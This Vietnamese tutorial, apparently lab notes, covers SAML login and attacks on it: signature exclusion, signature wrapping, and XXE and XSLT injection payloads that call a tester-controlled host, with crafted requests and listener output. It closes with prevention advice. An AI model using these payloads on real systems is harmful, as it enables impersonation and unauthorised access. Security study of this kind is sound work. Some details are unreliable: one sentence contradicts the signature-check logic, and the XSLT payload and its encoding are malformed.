  Phản hồi này cũng được mã hóa **Base64** và gửi qua POST request đến SP. Sau khi giải mã và giải nén, ta sẽ có một SAML **response** giống như sau:

  ```xml
  <samlp:Response ID="_6e61f34f4275f4b299932f628497567a6016798cf8" Version="2.0" IssueInstant="2024-03-29T10:27:14Z" Destination="http://academy.htb/acs.php" InResponseTo="ONELOGIN_d9da469d44203bb0a13fa8996bea4471592101b9">
      <Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</Issuer>
      <Status>
          <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
      </Status>
      <Assertion>
          <Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</Issuer>
          <Subject>
              <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">_fc173d61602f3a77ea73d722266d23e2cd8b7c5f90</NameID>
          </Subject>
          <AuthnStatement>
              <AuthnContext>
                  <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
              </AuthnContext>
          </AuthnStatement>
          <AttributeStatement>
              <Attribute Name="id">
                  <AttributeValue>1234</AttributeValue>
              </Attribute>
              <Attribute Name="name">
                  <AttributeValue>htb</AttributeValue>
              </Attribute>
              <Attribute Name="email">
                  <AttributeValue>[email protected]</AttributeValue>
              </Attribute>
          </AttributeStatement>
      </Assertion>
  </samlp:Response>
  ```

  - **Issuer**: Là IdP, nơi xác thực người dùng.
  - **Status**: Cho biết kết quả xác thực, ở đây là "Success" (thành công).
  - **Assertion**: Chứa thông tin về người dùng, bao gồm **id**, **name**, và **email**.

**3. Lý do sử dụng SAML:**
- **SSO (Single Sign-On)**: Người dùng chỉ cần đăng nhập một lần tại IdP và có thể truy cập vào nhiều SP mà không phải đăng nhập lại. Đây là lợi ích chính của việc sử dụng SAML trong môi trường đa dịch vụ.
- **Bảo mật**: SAML sử dụng chữ ký số để bảo vệ dữ liệu khỏi việc bị giả mạo hoặc thay đổi.

**Ví dụ dễ hiểu:**
Giả sử bạn là người dùng muốn đăng nhập vào một nền tảng học trực tuyến (SP). Thay vì nhập mật khẩu mỗi lần, bạn sẽ được chuyển đến một dịch vụ đăng nhập duy nhất (IdP) như Google, Facebook, hoặc hệ thống nội bộ của công ty bạn. Sau khi đăng nhập thành công, bạn sẽ được đưa về lại nền tảng học trực tuyến mà không cần phải nhập lại thông tin xác thực.

---
# 2. Tấn công "Signature Exclusion" trong SAML

**Tấn công "Signature Exclusion"** là một dạng tấn công trong đó kẻ tấn công sẽ thay đổi phản hồi SAML bằng cách **loại bỏ chữ ký số**. Nếu một nhà cung cấp dịch vụ (SP) được cấu hình sai để chỉ kiểm tra chữ ký khi có và mặc định chấp nhận phản hồi SAML nếu không có chữ ký, thì việc loại bỏ chữ ký sẽ cho phép kẻ tấn công thay đổi phản hồi SAML để giả mạo người dùng khác.

#### Ví dụ về việc kiểm tra chữ ký trong SAML:

Khi chúng ta đăng nhập thành công vào một ứng dụng, hệ thống sẽ sử dụng thông tin đăng nhập được xác thực thông qua một phản hồi SAML có chữ ký. Ví dụ, sau khi xác thực, hệ thống sẽ trả về một phản hồi SAML chứa thông tin người dùng:

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">htb-stdnt</saml:AttributeValue>
</saml:Attribute>
```

Để giả mạo người dùng, ta chỉ cần thay đổi giá trị tên người dùng từ "htb-stdnt" thành "admin", ví dụ:

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
</saml:Attribute>
```

Sau đó, ta mã hóa lại phản hồi SAML bằng Base64 và URL-encode, rồi thay thế vào phản hồi SAML hợp lệ trong yêu cầu HTTP:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 8811
Content-Type: application/x-www-form-urlencoded
SAMLResponse=PHNhb...[encoded data]...%3d&RelayState=%2Facs.php
```

Tuy nhiên, việc thay đổi này sẽ làm **chữ ký bị sai**, và nếu ứng dụng không kiểm tra chữ ký, sẽ từ chối phản hồi SAML này.

#### Tấn công Signature Exclusion:

Nếu ứng dụng bị cấu hình sai và không kiểm tra chữ ký của phản hồi SAML nếu không có phần tử chữ ký XML (ds:Signature), ta có thể thực hiện tấn công Signature Exclusion.

1. **Lấy phản hồi SAML gốc**: Lúc này, ta có thể truy cập vào phản hồi SAML và thực hiện thay đổi tên người dùng từ "htb-stdnt" thành "admin".

2. **Loại bỏ chữ ký**: Ta cần **xóa phần tử chữ ký** trong phản hồi SAML, ví dụ: phần tử `<ds:Signature>` trong XML.

Sau khi xóa chữ ký và thay đổi dữ liệu như trên, phản hồi SAML sẽ trông như thế này:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
                ID="d821fe97fd0710b1df434c5fff579972d67d1cd358" 
                Version="2.0" 
                IssueInstant="2024-03-29T17:44:58Z" 
                Destination="http://academy.htb/acs.php">
    <saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer>
    <saml:Assertion ID="1cdba427a3574890ffd9124728527fe5823c2976ac" Version="2.0">
        <saml:Attribute Name="name">
            <saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
        </saml:Attribute>
    </saml:Assertion>
</samlp:Response>
```

3. **Mã hóa lại dữ liệu**: Giống như trước, ta cần **mã hóa lại dữ liệu** bằng Base64 và URL-encode rồi gửi trong yêu cầu HTTP:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 3285
Content-Type: application/x-www-form-urlencoded
SAMLResponse=PHNhbW...[encoded data]...%2b&RelayState=%2Facs.php
```

Nếu ứng dụng không kiểm tra chữ ký trong phản hồi SAML (do không có phần tử chữ ký), nó sẽ **chấp nhận phản hồi đã bị thay đổi**, và kẻ tấn công sẽ thành công trong việc **giả mạo người dùng là admin**.

---
# 3. Tấn công **Signature Wrapping** trong SAML

Tấn công **Signature Wrapping** là một kiểu tấn công nhằm lợi dụng sự không nhất quán giữa logic xác minh chữ ký và logic trích xuất thông tin xác thực trong **SAML assertion**. Mục tiêu của tấn công này là chèn các phần tử XML vào trong phản hồi SAML sao cho không làm vô hiệu hóa chữ ký nhưng lại có thể làm ứng dụng bị nhầm lẫn, dẫn đến việc ứng dụng sử dụng thông tin xác thực chưa được ký thay vì thông tin xác thực đã được ký.

#### Cấu trúc của phản hồi SAML và chữ ký

Trong SAML, Identity Provider (IdP) có thể ký toàn bộ phản hồi SAML hoặc chỉ ký phần **SAML Assertion**. Phần tử được ký trong phản hồi SAML sẽ được tham chiếu trong một **ds:Reference XML-node**, trong đó bao gồm thuộc tính **URI** trỏ tới ID của **SAML Assertion**. Ví dụ:

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" ...>
  <saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" ...>
    ...
    <ds:Signature>
      <ds:SignedInfo>
        ...
        <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
          ...
        </ds:Reference>
      </ds:SignedInfo>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

Chữ ký bảo vệ phần **SAML Assertion** trong ví dụ trên, không bảo vệ toàn bộ phản hồi SAML. Điều này có nghĩa là tấn công có thể chèn thêm các assertion vào phản hồi mà không làm vô hiệu hóa chữ ký.

#### Các kiểu chữ ký

- **Chữ ký nhúng (Enveloped Signature):** Chữ ký là một phần tử con của phần tử mà nó ký. Đây là kiểu chữ ký trong ví dụ trên, nơi chữ ký là một phần của **SAML Assertion**.
- **Chữ ký bao bọc (Enveloping Signature):** Chữ ký xuất hiện trước phần tử được ký trong cấu trúc XML.
- **Chữ ký tách biệt (Detached Signature):** Chữ ký không phải là phần tử con cũng không phải phần tử cha của phần tử được ký.

#### Thực hiện tấn công Signature Wrapping

Mục tiêu của tấn công Signature Wrapping là chèn thêm một **SAML Assertion** mới vào trước assertion đã được ký mà không làm vô hiệu hóa chữ ký ban đầu. Vì chữ ký chỉ bảo vệ assertion đã được chỉ định trong **ds:Reference URI** nhưng không kiểm tra sự tồn tại của nhiều assertion, ứng dụng có thể lấy thông tin xác thực từ assertion đầu tiên mà nó tìm thấy, và có thể là assertion không được ký.

Ví dụ, ta có thể chèn thêm một assertion đã bị thay đổi (ví dụ: thay đổi tên người dùng và email) vào trước assertion đã được ký, như sau:

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" ...>
  <saml:Assertion ID="_evilID" ...> <!-- Assertion chèn thêm -->
    <saml:AttributeStatement>
      <saml:Attribute Name="id">
        <saml:AttributeValue>1337</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="name">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="email">
        <saml:AttributeValue>[email protected]</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" ...> <!-- Assertion gốc -->
    ...
  </saml:Assertion>
</samlp:Response>
```

Kết quả là phản hồi SAML sẽ có hai assertion: một assertion đã được ký và một assertion không được ký (mới chèn vào). Khi ứng dụng xử lý, nó có thể lấy thông tin từ assertion đầu tiên (assertion mới chèn) mà không kiểm tra tính hợp lệ của chữ ký.

#### Các bước thực hiện tấn công:

1. **Lấy phản hồi SAML:** Trước tiên, bạn cần lấy phản hồi SAML có chữ ký bảo vệ phần **SAML Assertion**.
2. **Manipulate Assertion:** Bạn sao chép phần **SAML Assertion** gốc và thay đổi các giá trị như ID, tên người dùng, email để chứng minh tấn công.
3. **Chèn thêm Assertion:** Bạn chèn assertion đã thay đổi vào vị trí thích hợp trong phản hồi SAML mà không làm vô hiệu hóa chữ ký ban đầu.
4. **Base64-encode và URL-encode:** Cuối cùng, mã hóa phản hồi SAML thành Base64 và URL-encode trước khi gửi đến service provider.

#### Kết quả

Tấn công thành công khi:

- Logic xác minh chữ ký chỉ kiểm tra sự tồn tại của chữ ký mà không kiểm tra số lượng assertion trong phản hồi.
- Ứng dụng sử dụng assertion đầu tiên mà nó tìm thấy trong phản hồi, do đó sử dụng assertion không được ký mà kẻ tấn công đã thao túng.

---
# 4. Các lỗ hổng bổ sung trong SAML

SAML sử dụng định dạng dữ liệu XML để biểu diễn dữ liệu, do đó các triển khai SAML bị lỗi có thể dễ bị tấn công thông qua các cuộc tấn công vào dữ liệu dạng XML. Hai kiểu tấn công phổ biến là **eXternal Entity Injection (XXE)** và **XSLT Server-side Injection**.

### Tấn công XXE (External Entity Injection)
Nếu nhà cung cấp dịch vụ SAML sử dụng một bộ phân tích XML (XML parser) cấu hình sai và cho phép tải các thực thể bên ngoài, hệ thống có thể bị tấn công XXE. Chúng ta có thể thử tiêm một payload XXE vào phản hồi SAML để kiểm tra lỗ hổng này. Ví dụ, chúng ta có thể tiêm một payload để thử kết nối đến một hệ thống dưới quyền kiểm soát của mình như sau:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
```

Để tiêm payload, chúng ta cần có bản XML của phản hồi SAML, giống như các bước đã thực hiện trước đó. Sau đó, ta có thể tiêm payload vào đầu phản hồi SAML, kết quả là cấu trúc như sau:

```xml
<samlp:Response>
[...]
</samlp:Response>
```

Sau khi mã hóa Base64 và URL hóa dữ liệu XML, chúng ta có thể gửi phản hồi SAML đã bị thay đổi:

```
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 6205
Content-Type: application/x-www-form-urlencoded
SAMLResponse=PD94bWw[...]%3d&RelayState=%2Facs.php
```

Nếu nhà cung cấp dịch vụ bị lỗ hổng XXE, chúng ta sẽ nhận được kết nối đến hệ thống đã chỉ định. Ví dụ, ta có thể lắng nghe kết nối tại cổng 8000:

```
nc -lnvp 8000
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52206
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```

Lỗ hổng này thường không hiển thị dữ liệu kết quả cho chúng ta, do đó đây là một lỗ hổng mù, khiến cho việc khai thác trở nên phức tạp hơn. Chi tiết hơn về XXE có thể tham khảo trong module Web Attacks.

### Tấn công XSLT Server-side Injection
Tương tự như XXE, nếu bộ phân tích XML bị cấu hình sai, nó có thể dễ bị tấn công XSLT Server-side Injection, tùy thuộc vào cách bộ phân tích XML xử lý dữ liệu phản hồi SAML. Cũng giống như trước, chúng ta có thể thử tiêm một payload XSLT để tạo kết nối đến một máy chủ dưới quyền kiểm soát của mình. Payload XSLT có thể trông như sau:

```xml
<?xml version="1.0" encoding="utf-8"?>
<stylesheet version="1.0" xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://172.17.0.1:8000/')"/>
  </xsl:template>
</stylesheet>
```

Sau khi mã hóa Base64 và URL hóa payload, chúng ta có thể gửi phản hồi SAML đã bị thay đổi:

```
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 361
Content-Type: application/x-www-form-urlencoded
SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjx4c2w6c3R5bGVzaGVldCB2ZXJzaW9uPSIxLjAiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4NCjx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPg0KPHhzbDpjb3B5LWIgb3YgcmVsYXRlPSJkb2N1bWVudCgnYXR0cC9odHRwOi8vMTcyLjE3LjAuMjo4MDAwLyc7Ii8+DQpAdGVtcGxhdGU+%3d&RelayState=%2Facs.php
```

Nếu nhà cung cấp dịch vụ bị lỗ hổng XSLT Server-side Injection, chúng ta sẽ nhận được kết nối tương tự như sau:

```
nc -lnvp 8000
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57128
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```

Lưu ý rằng nhà cung cấp dịch vụ có thể bị lỗ hổng, mặc dù payload tiêm của chúng ta không chứa một phản hồi SAML hợp lệ, và do đó dịch vụ có thể từ chối yêu cầu và từ chối cấp quyền truy cập. Nếu chỉ tiêm payload XSLT không thành công, chúng ta cũng có thể thử tiêm payload vào node `ds:Transform` của phản hồi SAML hợp lệ để kiểm tra xem liệu payload XSLT có được kích hoạt trong quá trình phân tích dữ liệu SAML hay không, miễn là phản hồi SAML chứa thông tin xác thực hợp lệ.

---
# 5. Công cụ và Phòng ngừa Lỗ hổng SAML

Sau khi thảo luận về các lỗ hổng trong các triển khai SAML, chúng ta sẽ tìm hiểu một số công cụ giúp đơn giản hóa quá trình nhận diện và khai thác lỗ hổng, cũng như cách phòng ngừa các lỗ hổng liên quan đến SAML.

### Công cụ Thực Hành

**SAML Raider** là một extension cho BurpSuite, được thiết kế để nhận diện và khai thác các lỗ hổng trong các triển khai SAML. Chúng ta có thể cài đặt SAML Raider từ BurpSuite App Store dưới mục **Extensions > BApp Store**.

Sau khi cài đặt extension, SAML Raider sẽ tự động làm nổi bật các yêu cầu chứa dữ liệu SAML trong tab HTTP proxy:

1. **Burp Repeater**: Để khám phá thêm các tính năng của SAML Raider, ta có thể gửi yêu cầu gửi phản hồi SAML đến nhà cung cấp dịch vụ tới Burp Repeater. Như chúng ta thấy, SAML Raider sẽ thêm một tab mới vào yêu cầu trong Burp Repeater.

2. **Thông tin và Phân tích Dữ liệu SAML**: Bằng cách nhấn vào tab **SAML Raider** và chọn **SAML Message Info**, chúng ta có thể xem thông tin tổng quan về dữ liệu SAML và dữ liệu XML đã được giải mã ở dưới cùng cửa sổ.

3. **Tab SAML Attacks**: Trong tab **SAML Attacks**, ta có thể khai thác tất cả các lỗ hổng đã được thảo luận trong module này. Ví dụ, ta có thể thực hiện tấn công **signature exclusion** bằng cách nhấn vào nút **Remove Signatures**. SAML Raider sẽ tự động loại bỏ node `ds:Signature` khỏi phản hồi SAML. Ngoài ra, ta còn có thể thực hiện các tấn công **XXE** và **XSLT**, cùng với tám biến thể khác của tấn công **signature wrapping**.

SAML Raider sẽ điều chỉnh phản hồi SAML tương ứng và mã hóa lại dữ liệu XML. Tất cả những gì chúng ta cần làm sau khi chọn tấn công trong SAML Raider là gửi lại yêu cầu trong Burp Repeater. Điều này giúp đơn giản hóa việc nhận diện và khai thác lỗ hổng, vì chúng ta không phải giải mã và mã hóa lại dữ liệu XML của phản hồi SAML bằng tay.

### Phòng Ngừa Lỗ Hổng

Để ngăn ngừa các lỗ hổng do triển khai SAML sai, điều quan trọng là phải sử dụng một thư viện SAML được xác nhận để xử lý các thao tác liên quan đến SAML, chẳng hạn như xác minh chữ ký và trích xuất thông tin xác thực từ các tuyên bố SAML. Nếu thư viện SAML được cập nhật thường xuyên, các lỗ hổng đã thảo luận trong các phần trước sẽ được vá.

Một số biện pháp phòng ngừa bao gồm:
- **Sử dụng thư viện SAML uy tín và cập nhật**: Các thư viện này có thể giúp giảm thiểu nguy cơ bị tấn công bởi các phương thức như XXE, XSLT injection, hay signature wrapping.
- **Cấu hình đúng các bộ phân tích XML**: Đảm bảo rằng các bộ phân tích XML không cho phép tải các thực thể bên ngoài (XXE) hoặc các payload độc hại (XSLT injection).
- **Kiểm tra chữ ký SAML**: Luôn kiểm tra chữ ký SAML để đảm bảo rằng không có sự thay đổi dữ liệu độc hại.

Để biết thêm chi tiết về bảo mật SAML, có thể tham khảo **OWASP's SAML Security Cheat Sheet** để có những hướng dẫn và biện pháp phòng ngừa cụ thể hơn.

